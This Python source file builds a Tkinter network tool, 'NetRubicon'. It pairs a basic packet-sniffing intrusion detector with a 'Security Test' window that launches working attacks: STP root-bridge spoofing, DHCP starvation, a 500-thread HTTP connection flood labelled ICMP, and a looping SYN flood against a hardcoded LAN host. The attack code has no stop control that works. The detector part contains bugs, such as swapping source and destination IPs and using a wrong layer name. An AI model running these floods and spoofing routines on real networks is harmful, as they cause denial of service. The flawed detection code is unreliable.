from itertools import count
from tabnanny import verbose
from tkinter import *
from tkinter import ttk
import tkinter as tk
import scapy.all as scapy
from scapy.all import wrpcap, TCP, send, sniff, time, Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf, rdpcap, ICMP, RandShort, Raw
import os
import sys
import threading
import collections
from time import gmtime, strftime
import pyshark
import socket
import collections
import numpy as np
import matplotlib.pyplot as plt

root = Tk()

root.geometry('400x300')
root.title('NetRubicon')


thread = None
should_we_stop = True


src_ip_dict = collections.defaultdict(list)
count = 0


def ids():
    global treev
    global fram3_display
    global fram2_display
    global fram4_display
    global handleOpenEvent

    def start_button():
        print('start button clicked')
        global should_we_stop
        global thread
        global host_ip

        interface = interface_input.get()
        host_ip = interface

        if(thread is None) or (not thread.is_alive()):
            should_we_stop = False
            thread = threading.Thread(target=sniffing)
            thread.start()

    def stop_button():
        global should_we_stop
        should_we_stop = True

    def sniffing():
        scapy.sniff(prn=find_ips, stop_filter=stop_sniffing)

    def stop_sniffing(packet):
        global should_we_stop
        return should_we_stop

    def find_ips(packet):
        global src_ip_dict
        global treev
        global host_ip
        global handleOpenEvent
        global pkt
        global count
        wrpcap('sniffed.pcap', packet, append=True)
        # print(packet.id)

        if 'IP' in packet:
            src_ip = packet['IP'].src
            dst_ip = packet['IP'].dst

            if src_ip[0:len(host_ip)] == host_ip:
                if src_ip not in src_ip_dict:
                    src_ip_dict[src_ip].append(dst_ip)

                    row = treev.insert('', index=tk.END, text=src_ip)
                    treev.insert(row, tk.END, text=dst_ip)

                else:
                    if dst_ip not in src_ip_dict[src_ip]:
                        src_ip_dict[src_ip].append(dst_ip)

                        curl_item = treev.focus()

                        if (treev.item(curl_item)['text'] == src_ip):
                            treev.insert(curl_item, tk.END, text=dst_ip)

        if 'TCP' in packet:
            log = open('tcp.log', 'a+')
            dst_port = packet['TCP'].dport
            src_port = packet['TCP'].sport
            src_mac = packet['Ethernet'].src
            dst_mac = packet['Ethernet'].dst
            packet_size = len(packet)
            time = str(strftime("%H:%M:%S", gmtime()))
            window_size = packet['TCP'].window
            flag = packet['TCP'].flags

            if window_size < 500 or window_size > 65000 or "RST" in flag or ' ' in flag:
                log_window = open('untrusted_packets.log', 'a+')
                wrpcap('untrust.pcap', packet, append=True)
                count += 1

                pa_displayed = "destination ip" + '   ' + \
                    str(dst_ip) + '   ' + "source ip" + '   ' + str(src_ip) + '    ' + \
                    "destination port" + '    ' + str(dst_port) + '    ' + \
                    "source port" + '    ' + \
                    str(src_port) + '    ' + str(count)

                fram2_display.insert('', tk.END, text=pa_displayed)

                log_packet_untrusted = pa_displayed + '    ' + "source mac" + '    ' + \
                    str(src_mac) + '    ' + "Destination mac" + \
                    '    ' + str(dst_mac) + '    ' + "Packet size" + \
                    '    ' + str(packet_size) + '    ' + \
                    "Time" + '    ' + str(time) + '    ' + \
                    "Window_size" + '    ' + str(window_size)

                log_window.write('\n' + log_packet_untrusted)

            else:
                pass

            packet_displayed = "TCP" + '    ' + "destination ip" + '   ' + \
                str(dst_ip) + '   ' + "source ip" + '   ' + str(dst_ip) + '    ' + \
                "destination port" + '    ' + str(dst_port) + '    ' + \
                "source port" + '    ' + str(src_port)

            fram3_display.insert(
                '', tk.END, text=packet_displayed)

            log_packet = packet_displayed + '    ' + "source mac" + '    ' + \
                str(src_mac) + '    ' + "Destination mac" + \
                '    ' + str(dst_mac) + '    ' + "Packet size" + \
                '    ' + str(packet_size) + '    ' + \
                "Time" + '    ' + str(time)

            log.write('\n' + log_packet)

        if 'UDP' in packet:
            log_udp = open('udp.log', 'a+')

            dst_port = packet['UDP'].dport
            src_port = packet['UDP'].sport
            src_mac = packet['Ethernet'].src
            dst_mac = packet['Ethernet'].dst
            packet_size = len(packet)
            time = str(strftime("%H:%M:%S", gmtime()))

            udp_packet_displayed = "UDP" + '   ' + "destination ip" + '   ' + \
                str(dst_ip) + '   ' + "source ip" + '   ' + str(dst_ip) + '    ' + \
                "destination port" + '    ' + str(dst_port) + '    ' + \
                "source port" + '    ' + str(src_port)
            fram3_display.tag_configure('UDP', background="Blue")
            fram3_display.insert(
                '', tk.END, text=udp_packet_displayed, tags=('UDP'))

            log_packet_udp = udp_packet_displayed + '    ' + "source mac" + '    ' + \
                str(src_mac) + '    ' + "Destination mac" + \
                '    ' + str(dst_mac) + '    ' + "Packet size" + \
                '    ' + str(packet_size) + '    ' + \
                "Time" + '    ' + str(time)
            log_udp.write('\n' + log_packet_udp)

        if 'ICMP' in packet:
            src_ip = packet['IP'].src
            dst_ip = packet['IP'].dst
            log_window = open('untrusted_packets.log', 'a+')
            wrpcap('untrust.pcap', packet, append=True)
            count += 1

            pa_displayed = "ICMP" + "    " + 'Source Ip' + '    ' + \
                str(src_ip) + '    ' + 'Destination Ip' + \
                '    ' + str(dst_ip) + '    ' + str(count)

            fram2_display.insert('', tk.END, text=pa_displayed)

    def OpenPcapFile():
        cap = pyshark.FileCapture('untrust.pcap', only_summaries=True)
        protocollist = []
        for pkt in cap:
            line = str(pkt)
            formattedline = line.split(" ")
            protocollist.append(formattedline[4])
        counter = collections.Counter(protocollist)
        plt.style.use('ggplot')
        y_pos = np.arange(len(list(counter.keys())))
        plt.bar(y_pos, list(counter.values()), align='center',
                alpha=0.5, color=['b', 'g', 'r', 'c', 'm'])
        plt.xticks(y_pos, list(counter.keys()))
        plt.ylabel("Frequency")
        plt.xlabel("Protocol Name")
        plt.show()

    def livepacket():
        pkt_id = packet_id.get()

        try:
            p = int(pkt_id) - 2
            cap = pyshark.FileCapture('untrust.pcap', only_summaries=True)
            x = cap[int(p)]

            fram4_display.insert('', tk.END, text=x)
        except:
            cap = pyshark.FileCapture('untrust.pcap', only_summaries=True)
            for pkt in cap:
                fram4_display.insert('', tk.END, text=pkt)

    def MoreInfo():
        try:
            os.system(
                'wireshark /home/sshadow/Documents/django/Netrubicon/untrust.pcap')
        except:
            pass

    ids_window = Tk()
    ids_window.title('NetRubicon IDS')

    panedwindow = ttk.Panedwindow(ids_window, orient=HORIZONTAL)
    panedwindow.pack(fill=BOTH, expand=True)

    fram1 = ttk.Frame(panedwindow, width=200, height=200, relief=SUNKEN)
    fram2 = ttk.Frame(panedwindow, width=200, height=200, relief=SUNKEN)
    panedwindow.add(fram1, weight=2)
    panedwindow.add(fram2, weight=2)

    panedwindow2 = ttk.PanedWindow(ids_window, orient=HORIZONTAL)
    panedwindow2.pack(fill=BOTH, expand=True)
    fram3 = ttk.Frame(panedwindow2, width=200, height=200, relief=SUNKEN)
    fram4 = ttk.Frame(panedwindow2, width=200, height=200, relief=SUNKEN)
    panedwindow2.add(fram3, weight=2)
    panedwindow2.add(fram4, weight=2)

    interface_name = Label(fram1, text='Enter Ip address/leave blank',
                           font="Helvetica 10 bold")
    interface_name.pack()
    trusted_packets = Label(fram3, text="All Packets",
                            font="Helvetica 10 bold")
    trusted_packets.pack()
    untrusted_packets = Label(
        fram2, text="Untrusted Packets", font="Helvetica 10 bold")
    untrusted_packets.pack()
    interface_input = tk.Entry(fram1)
    interface_input.pack()

    packet_id = tk.Entry(fram4)
    packet_id.pack(padx=5, pady=5)

    style = ttk.Style()
    style.theme_use("clam")
    style.configure("Treeview",
                    background="silver",
                    foreground="black",
                    fieldbackground="silver",
                    rowheight=25,
                    )
    style.map('Treeview', background=[('selected', 'green')])

    treev = ttk.Treeview(fram1)
    treev.pack(fill=BOTH, expand=True)

    fram3_display = ttk.Treeview(fram3)
    fram3_display.pack(fill=BOTH, expand=True)

    fram2_display = ttk.Treeview(fram2)
    fram2_display.pack(fill=BOTH, expand=True)

    fram4_display = ttk.Treeview(fram4)
    fram4_display.pack(fill=BOTH, expand=True)

    button_flame = Frame(fram1)
    Button(button_flame, text='start sniffing', command=start_button,
           width=10, font='Helvetica 16 bold').pack(side=LEFT)
    Button(button_flame, text='stop sniffing', command=stop_button,
           width=10, font='Helvetica 16 bold').pack(side=LEFT)
    button_flame.pack(side=BOTTOM, pady=10)

    button_flame2 = Frame(fram4)
    Button(button_flame2, text="Get Info", width=10, command=livepacket,
           font='Helvetica 10 bold').pack(side=LEFT)
    Button(button_flame2, text="Untrusted packet graph", width=20, command=OpenPcapFile,
           font='Helvetica 10 bold').pack(side=LEFT)
    button_flame2.pack(side=BOTTOM, pady=10)

    button_flame3 = Frame(fram2)
    Button(button_flame3, text="More Info", width=10, command=MoreInfo,
           font='Helvetica 10 bold').pack(side=LEFT)
    button_flame3.pack(side=BOTTOM, pady=10)

    ids_window.mainloop()


def Securitytest():
    security_window = Tk()
    security_window.title('NetRubicon Security Test')
    security_window.geometry("400x400")

    security_label = Label(
        security_window, text="Welcome to security testing", font="Helvetica 15 bold")
    security_label.pack()

    # drop down menu
    def startattack():
        global thread
        global should_we_stop

        if(thread is None) or (not thread.is_alive()):
            should_we_stop = False
            thread = threading.Thread(target=stattack)
            thread.start()

    def stattack():
        selected_attack = attack.get()

        if 'STP' in selected_attack:
            pkt = sniff(filter="ether dst 01:80:c2:00:00:00", count=1)
            pkt[0].pathcost = 0
            pkt[0].bridgemac = pkt[0].rootmac
            pkt[0].portid = 1
            for i in range(0, 50):
                pkt[0].show()
                send(pkt[0], loop=0, verbose=1)
                time.sleep(1)
        if 'DHCP' in selected_attack:
            fram_display.insert('', tk.END, text='DHCP \n starting attack')
            conf.checkIPaddr = False
            dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC())  \
                / IP(src='0.0.0.0', dst='255.255.255.255') \
                / UDP(sport=68, dport=67) \
                / BOOTP(op=1, chaddr=RandMAC()) \
                / DHCP(options=[('message-type', 'discover'), ('end')])

            # Send packet out of an interface and loop the packet
            sendp(dhcp_discover, iface='wlan0', loop=1, verbose=1)
            fram_display.insert('', tk.END, text=verbose)
            print("DHCP")

        if 'ICMP' in selected_attack:
            fram_display.insert('', tk.END, text='ICMP \n starting attack')
            target = '192.168.43.16'
            fake_ip = '182.21.20.32'
            port = 80

            def ICMPattack():
                while True:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    s.sendto(
                        ("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                    s.sendto(
                        ("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                    s.close()

            for i in range(500):
                thread = threading.Thread(target=ICMPattack)
                thread.start()

        if 'TCP' in selected_attack:
            fram_display.insert('', tk.END, text='TCP \n starting attack')
            target_ip = "192.168.43.16"
            target_port = 80
            ip = IP(dst=target_ip)
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
            raw = Raw(b"X"*1024)
            p = ip / tcp / raw
            send(p, loop=1, verbose=1)

        else:
            fram_display.insert('', tk.END, text="No attack selected")

    def stopattack():
        global should_we_stop
        should_we_stop = True
        sys.exit

    def spattack():
        sys.exit()

    options = [
        "STP",
        "TCP",
        "ICMP",
        "DHCP",
    ]
    attack = StringVar()

    drop = OptionMenu(security_window, attack, *options)
    drop.pack()
    fram_display = ttk.Treeview(security_window)
    fram_display.pack(expand=True, fill=BOTH)

    button_st = Frame(security_window)
    Button(button_st, text='Start Attack', command=startattack,
           width=15, font='Helvetica 16 bold').pack(side=LEFT)
    Button(button_st, text='Stop Attack', command=stopattack,
           width=15, font='Helvetica 16 bold').pack(side=LEFT)
    button_st.pack(side=BOTTOM, pady=10)

    security_window.mainloop()


button_flame = Frame(root)
Button(button_flame, text='Start IDS', command=ids,
       width=15, font='Helvetica 16 bold').pack(side=LEFT)
Button(button_flame, text='Security Test', command=Securitytest,
       width=15, font='Helvetica 16 bold').pack(side=LEFT)

button_flame.pack(side=LEFT, pady=10)

root.mainloop()
